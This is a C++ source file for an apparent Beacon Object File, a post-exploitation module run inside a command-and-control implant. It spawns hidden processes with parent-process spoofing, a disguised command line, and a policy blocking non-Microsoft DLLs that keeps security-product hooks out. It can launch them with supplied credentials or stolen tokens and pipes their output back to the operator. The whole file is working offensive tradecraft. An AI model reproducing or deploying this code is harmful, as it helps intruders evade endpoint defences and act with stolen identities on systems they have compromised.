#include <general.h>
#include <externs.h>

auto kh_process_creation( 
    _In_  PS_CREATE_ARGS*      create_args,
    _Out_ PROCESS_INFORMATION* ps_information
) -> NTSTATUS {
    auto process_cmdline = ( create_args->spoofarg ? create_args->spoofarg : create_args->argument );
    auto process_flags   = (CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT);
    auto process_policy  = UINT_PTR{ 0 };
    auto process_info    = PROCESS_INFORMATION{ 0 };
    auto startup_info_ex = STARTUPINFOEXW{ 0 };
    auto security_attr   = SECURITY_ATTRIBUTES{ sizeof( SECURITY_ATTRIBUTES ), nullptr, TRUE };

    auto buffer_read    = ULONG{ 0 };
    auto pipe_buff      = PBYTE{ nullptr };
    auto pipe_read      = HANDLE{ nullptr };
    auto pipe_write     = HANDLE{ nullptr };
    auto pipe_duplicate = HANDLE{ nullptr };
    auto parent_handle  = HANDLE{ nullptr };

    auto attribute_buff = PVOID{ nullptr };
    auto attribute_size = SIZE_T{ 0 };

    auto update_attr_count = 0;

    bool success = false;

    startup_info_ex.StartupInfo.cb      = sizeof( STARTUPINFOEXW );
    startup_info_ex.StartupInfo.dwFlags = SW_HIDE;

    auto cleanup = [&]( void ) -> NTSTATUS {
        if ( attribute_buff ) {
            DeleteProcThreadAttributeList( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff );
            free( attribute_buff );
        }

        if ( pipe_read     ) CloseHandle( pipe_read     );
        if ( pipe_write    ) CloseHandle( pipe_write    );
        if ( parent_handle ) CloseHandle( parent_handle );

        return STATUS_SUCCESS;
    };

    if ( create_args->ppid      ) update_attr_count++;
    if ( create_args->blockdlls ) update_attr_count++;

    if ( update_attr_count ) {
        InitializeProcThreadAttributeList( 0, update_attr_count, 0, &attribute_size );
        attribute_buff = malloc( attribute_size );
        if ( ! InitializeProcThreadAttributeList( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, update_attr_count, 0, &attribute_size ) ) 
            return cleanup();
    }

    if ( create_args->ppid ) {
        parent_handle = OpenProcess( PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE, FALSE, create_args->ppid );
        success       = UpdateProcThreadAttribute( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &parent_handle, sizeof( HANDLE ), nullptr, nullptr );
        if ( ! success ) return cleanup();
    }

    if ( create_args->blockdlls ) {
        process_policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
        success        = UpdateProcThreadAttribute( (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &process_policy, sizeof( UINT_PTR ), nullptr, nullptr );
        if ( ! success ) return cleanup();
    }

    if ( attribute_buff ) startup_info_ex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)attribute_buff;

    if ( create_args->pipe ) {
        success = CreatePipe( &pipe_read, &pipe_write, &security_attr, 0x10000 );
        if ( ! success ) {
            BeaconPrintf( CALLBACK_ERROR, "Failed to create pipe for read process output with error: (%d) %ls", GetLastError(), fmt_error( GetLastError() ) );
            return cleanup();
        }

        if ( create_args->ppid ) {
            success = DuplicateHandle( nt_current_process(), pipe_write, parent_handle, &pipe_duplicate, 0, TRUE, DUPLICATE_SAME_ACCESS );
            if ( ! success ) {
                BeaconPrintf( CALLBACK_ERROR, "Failed to duplicate handle for read output from parent process spoof with error: (%d) %ls", GetLastError(), fmt_error( GetLastError() ) );
                return cleanup();
            }

            CloseHandle( pipe_write );
            pipe_write = pipe_duplicate;
        }

        startup_info_ex.StartupInfo.hStdError  = pipe_write;
        startup_info_ex.StartupInfo.hStdOutput = pipe_write;
        startup_info_ex.StartupInfo.hStdInput  = GetStdHandle( STD_INPUT_HANDLE );
    }

    switch ( (Create)create_args->method ) {
        case Create::Default: {
            success = CreateProcessW( 
                nullptr, process_cmdline, nullptr, nullptr, TRUE, process_flags, 
                nullptr, nullptr, &startup_info_ex.StartupInfo, &process_info 
            );
            break;   
        }
        case Create::WithLogon: {
            success = CreateProcessWithLogonW(
                create_args->username, create_args->domain, create_args->password, LOGON_NETCREDENTIALS_ONLY, 
                nullptr, process_cmdline, process_flags, nullptr, nullptr, &startup_info_ex.StartupInfo, &process_info
            );
            break;
        }
        case Create::WithToken: {
            success = CreateProcessWithTokenW(
                create_args->token, LOGON_NETCREDENTIALS_ONLY, nullptr, process_cmdline, 
                process_flags, nullptr, nullptr, &startup_info_ex.StartupInfo, &process_info
            );
        }
    }

    if ( ! success ) {
        BeaconPrintf( CALLBACK_ERROR, "Failed to create process with error: (%d) %ls", GetLastError(), fmt_error( GetLastError() ) );
        return cleanup();
    }

    BeaconPrintf( CALLBACK_OUTPUT, "Process created with - PID: %d - TID: %d\n", process_info.dwProcessId, process_info.dwThreadId );

    if ( pipe_write ) {
        CloseHandle( pipe_write ); pipe_write = nullptr;
    }

    if ( create_args->pipe ) {
        WaitForSingleObject( process_info.hProcess, 4000 );

        pipe_buff = (PBYTE)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, PIPE_BUFFER_DEFAULT_LEN );

        if ( ReadFile( pipe_read, pipe_buff, PIPE_BUFFER_DEFAULT_LEN, &buffer_read, nullptr ) ) {
            BeaconPrintfW( CALLBACK_OUTPUT, (WCHAR*)pipe_buff, buffer_read );
        }

        HeapFree( GetProcessHeap(), 0, pipe_buff );
    }

    return cleanup();
}

#if !defined(USE_GO_ENTRY)
extern "C" auto go( int argc, char* args ) -> void {
    datap data_parser = { 0 };

    BeaconDataParse( &data_parser, args, argc );

    // parse bof args
    auto process_method   = (Create)BeaconDataInt( &data_parser );
    auto process_argument = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
    auto process_state    = BeaconDataInt( &data_parser );
    auto process_pipe     = BeaconDataInt( &data_parser );

    auto process_blockdlls = BeaconDataInt( &data_parser );
    auto process_ppid      = BeaconDataInt( &data_parser );
    auto process_spoofarg  = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );

    auto process_domain   = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
    auto process_username = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );
    auto process_password = (WCHAR*)BeaconDataExtract( &data_parser, nullptr );

    auto process_token = (HANDLE)BeaconDataInt( &data_parser );

    PS_CREATE_ARGS      create_args    = {};
    PROCESS_INFORMATION ps_information = {};

    create_args.method   = process_method;
    create_args.argument = process_argument;
    create_args.state    = process_state;
    create_args.pipe     = process_pipe;

    create_args.blockdlls = process_blockdlls;
    create_args.ppid      = process_ppid;
    create_args.spoofarg  = process_spoofarg;

    create_args.domain   = process_domain;
    create_args.username = process_username;
    create_args.password = process_password;

    kh_process_creation( &create_args, &ps_information );
}
#endif